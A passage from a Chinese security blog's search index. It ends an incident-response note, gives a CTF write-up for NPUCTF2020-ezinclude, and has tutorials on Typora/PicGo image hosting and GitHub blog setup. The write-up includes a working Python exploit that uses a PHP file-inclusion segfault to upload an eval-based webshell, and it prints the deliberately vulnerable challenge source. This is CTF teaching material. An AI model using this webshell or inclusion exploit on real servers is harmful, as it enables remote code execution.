alt="image-20220510162210193"></p><p>命令被替换或系统函数被劫持可以用busybox</p><p>busybox是一个集成了三百多个最常用Linux命令和工具的软件。</p><p>busybox包含了一些简单的工具，例如ls、cat、和echo等等，还包含了一下更大、更复杂的工具，例grep、find、mount以及telnet</p><p>查找SUID的程序：</p><p><code>find / -type f -perm -04000 -ls -uid 0 2&gt;/dev/null</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101639087.png" alt="image-20220510163933212"></p><p>通过chkrootkit、rkhunter、Webshell Check等手段得出以下应对措施：</p><ol><li>根据进程、连接等关联的程序，查看木马活动信息</li><li>假如系统的命令（例如netstat ls等）被替换，为了进一步排查，需要下载一份新的或者从其他未感染的主机拷贝新的命令</li><li>发现可执行的木马文件，不要急于删除，先打包备份一份</li><li>发现可以的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等</li></ol>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CORE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ezinclude</title>
      <link href="/2022/05/04/2022-04-28-%5BNPUCTF2020%5Dezinclude%201/"/>
      <url>/2022/05/04/2022-04-28-%5BNPUCTF2020%5Dezinclude%201/</url>
      
        <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges#[NPUCTF2020]ezinclude">ezinclude</a></p><h2 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username/password error<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2、思路"><a href="#2、思路" class="headerlink" title="2、思路"></a>2、思路</h2><p>根据源码提示 传入GET数据包后查看返回数据包 看到 Cookie 的 Hash 值变更</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281148341.png" alt="image-20220428114816256"></p><p>pass参数传入变更后的Hash 返回数据包提示页面 flflflflag.php</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281150916.png" alt="image-20220428115015851"></p><p>进入页面自动跳转到 404.html，截取数据包重发送看到提示<img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281152628.png" alt="image-20220428115237551"></p><p>尝试伪协议读取源码</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281202540.png" alt="image-20220428120201465"></p><p>解码后可以看到 data input zip 都被ban了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>xxxxxxxxxx import requests​url&#x3D;’<a href="http://8b531e98-d1e8-409c-823f-c9d298fdae62.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#39;files">http://8b531e98-d1e8-409c-823f-c9d298fdae62.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#39;files</a> &#x3D; {    ‘file’:(‘shell.php’,    ‘<?php @eval($_POST[cmd])?>‘)}r &#x3D; requests.post(url&#x3D;url,files&#x3D;files)print(r.text)   python</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281254490.png" alt="image-20220428125405456"></p><p>利用 php7 segment fault 特性 <a href="https://qftm.github.io/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault">参考文档</a> 编写脚本上传phpinfo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8b531e98-d1e8-409c-823f-c9d298fdae62.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>上传后返回 dir.php 包含新增的文件，在phpinfo内看到flag</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281330003.png" alt="image-20220428133020932"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> FileInclude </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora+PicGo自动上传图片到图床</title>
      <link href="/2022/05/04/2022-04-27-Typora+PicGo%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E5%88%B0%E5%9B%BE%E5%BA%8A/"/>
      <url>/2022/05/04/2022-04-27-Typora+PicGo%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E5%88%B0%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="1、软件下载"><a href="#1、软件下载" class="headerlink" title="1、软件下载"></a>1、软件下载</h2><p>Typora：</p><p>城通网盘：<a href="https://www.ypojie.com/go/aHR0cHM6Ly91cmw5NS5jdGZpbGUuY29tL2QvMjIwNjQzOTUtNDU5NTgyMzEtZDU2MjRk">https://url95.ctfile.com/d/22064395-45958231-d5624d</a>（访问密码：YPOJIE）</p><p>PicGo：</p><p><a href="https://github.com/Molunerfinn/PicGo/releases">Releases · Molunerfinn&#x2F;PicGo (github.com)</a></p><h2 id="2、创建仓库-amp-生成Token"><a href="#2、创建仓库-amp-生成Token" class="headerlink" title="2、创建仓库&amp;生成Token"></a>2、创建仓库&amp;生成Token</h2><p>点击头像右上角 + 号创建仓库 仓库名称任意 选择为Public仓库</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271818303.png" alt="image-20220427181808265"></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271819195.png" alt="image-20220427181945124"></p><p>点击头像选择 Settings，左侧点击 Developer settings，选择左侧 Personal access tokens，点击 Generate new token 生成Token</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271820179.png" alt="image-20220427182034143"></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271820989.png" alt="image-20220427182045957"></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271821341.png" alt="image-20220427182149263"></p><h2 id="3、配置PicGo"><a href="#3、配置PicGo" class="headerlink" title="3、配置PicGo"></a>3、配置PicGo</h2><blockquote><p>PicGo设置 勾选 时间戳重命名，选择显示的图床勾选 Github图床 其他取消选择</p><p>GitHub图床设置 设定仓库名、设定分支名、设定Token、设定自定义域名（这里设置自定义域名的作用既是使用cdn加速访问github图床内的照片）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271816049.png" alt="image-20220427181645998"></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271817043.png" alt="image-20220427181659991"></p><h2 id="4、配置Typora"><a href="#4、配置Typora" class="headerlink" title="4、配置Typora"></a>4、配置Typora</h2><p>点击左上角 文件 &gt; 偏好设置 &gt; 图像</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271814464.png" alt="image-20220427181424280"></p><p>配置完成后  直接在Typora内粘贴即可实现 图片自动上传至Github并使用jsdelivr CDN加速访问</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github搭建博客</title>
      <link href="/2022/05/04/2022-04-27-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2022/05/04/2022-04-27-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><p>Hexo 基于 Node.js，搭建过程中还需要使用 npm（Node.js 已带） 和 git，因此先搭建本地操作环境，安装 Node.js 和 Git。</p><ul><li>Node.js：<a href="https://nodejs.org/zh-cn">https://nodejs.org/zh-cn</a></li><li>Git：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271828429.png" alt="img"></p><h2 id="2、创建Github仓库"><a href="#2、创建Github仓库" class="headerlink" title="2、创建Github仓库"></a>2、创建Github仓库</h2><p>点击Github主页右上角+号选择New repository</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825382.png" alt="img"></p><ul><li>Repository name：用户名.github.io</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271828884.png" alt="img"></p><p>填好后点击 Create repository 创建</p><h2 id="2、Git连接Github"><a href="#2、Git连接Github" class="headerlink" title="2、Git连接Github"></a>2、Git连接Github</h2><p>任意位置右键点击 Git Bash Here</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825435.png" alt="img"></p><p><strong>设置用户名&amp;邮箱：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;GitHub 用户名&quot;</span><br><span class="line">git config --global user.email &quot;GitHub 邮箱&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825387.png" alt="img"></p><p><strong>创建SSH秘钥：</strong></p><p>输入命令 ssh-keygen -t rsa -C “GitHub 邮箱” 后一路回车</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271828515.png" alt="img"></p><p><strong>添加秘钥：</strong></p><p>打开生成的秘钥复制内容</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825254.png" alt="img"><br><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825281.png" alt="img"></p><p>Github右上角展开点击Settings</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271828926.png" alt="img"></p><p>左侧选择 SSH and GPG keys</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825345.png" alt="img"></p><p>点击 New SSH key</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271828034.png" alt="img"></p><p>Title填写任意内容，将复制的内容粘贴进Key后点击 Add SSH key</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829309.png" alt="img"></p><p><strong>验证连接</strong></p><p>打开Git Bash输入 <code>ssh -T git@github.com</code></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825133.png" alt="img"></p><p>显示 successfully连接成功</p><h2 id="3、jekyll-TeXt搭建博客"><a href="#3、jekyll-TeXt搭建博客" class="headerlink" title="3、jekyll-TeXt搭建博客"></a>3、jekyll-TeXt搭建博客</h2><p>下载博客程序</p><p><a href="https://github.com/kitian616/jekyll-TeXt-theme/archive/master.zip">https://github.com/kitian616/jekyll-TeXt-theme/archive/master.zip</a></p><p> 本地创建空文件夹 在空文件内打开 Git Bash 输入 <code>git init</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204280831397.png" alt="image-20220428083137365"></p><p>将压缩包内所有内容拖至文件夹内</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204280832129.png" alt="image-20220428083209072"></p><p>在 Git Bash 内部署上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git remote add origin git@github.com:用户名/仓库名称</span><br><span class="line">（git remote add origin git@github.com:7iray/7iray.github.io）</span><br><span class="line">git commit -m &quot;push&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204280833417.png" alt="image-20220428083323371"></p><blockquote><p>若分支名称非master 而是main 则需要切换分支 或者在 push 时选择分支为 main，完整命令为</p><p>创建分支：<code>git branch master</code></p><p>切换分支：<code>git checkout master</code></p></blockquote><p>此时GitHub仓库便已接收到Push内容，使用浏览器访问 用户名.github.io 即可看到博客</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204280842299.png" alt="image-20220428084209189"></p><p>在修改配置文件、创建新的文章后，再次push上传更改后的内容即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;push&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h2 id="3-2、Hexo搭建博客"><a href="#3-2、Hexo搭建博客" class="headerlink" title="3_2、Hexo搭建博客"></a>3_2、Hexo搭建博客</h2><blockquote><p>Hexo有更方便的管理与上传方式，也是可选择的框架之一</p></blockquote><p><strong>本地安装Hexo</strong></p><p>新建空文件夹用来存放Hexo程序，在文件内右键打开Git Bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825179.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829776.png" alt="img"></p><p>在Git Bash内输入 hexo init</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825362.png" alt="img"></p><p>再输入 hexo generate （可直接输入hexo g）将Hexo编译为HTML代码</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829374.png" alt="img"></p><p>输入 hexo server 在本地预览博客</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829138.png" alt="img"></p><p>届时博客已经在本地搭建成功</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829562.png" alt="img"></p><p><strong>配置README.md文件</strong></p><p>在本地文件夹source内新建 README.md 文件</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825136.png" alt="img"></p><p>打开配置_config.yml文件修改内容 skip_render: README.md</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829110.png" alt="img"></p><p><strong>上传博客至Github</strong></p><p>在Git Bash终端输入 npm install hexo-deployer-git –save 安装hexo-deployer-git插件用来将hexo部署到github</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825497.png" alt="img"></p><p>打开博客目录下的 _config.yml</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825522.png" alt="img"></p><p>下拉至底部 修改内容如下</p><p>在冒号后面记得跟上一个空格</p><ul><li>type: git</li><li>repo: <a href="mailto:&#103;&#x69;&#x74;&#64;&#103;&#x69;&#116;&#x68;&#117;&#x62;&#x2e;&#x63;&#x6f;&#109;">&#103;&#x69;&#x74;&#64;&#103;&#x69;&#116;&#x68;&#117;&#x62;&#x2e;&#x63;&#x6f;&#109;</a>:用户名&#x2F;仓库名</li><li>branch: master</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271830505.png" alt="img"></p><p>再打开Git Bash输入 hexo deploy 上传返回  INFO Deploy done: git 即为上传成功</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825306.png" alt="img"></p><p>仓库内已存在上传的hexo程序文件</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825117.png" alt="img"></p><p>最后访问仓库名称 moe7ilin.github.io 即可访问博客</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825354.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
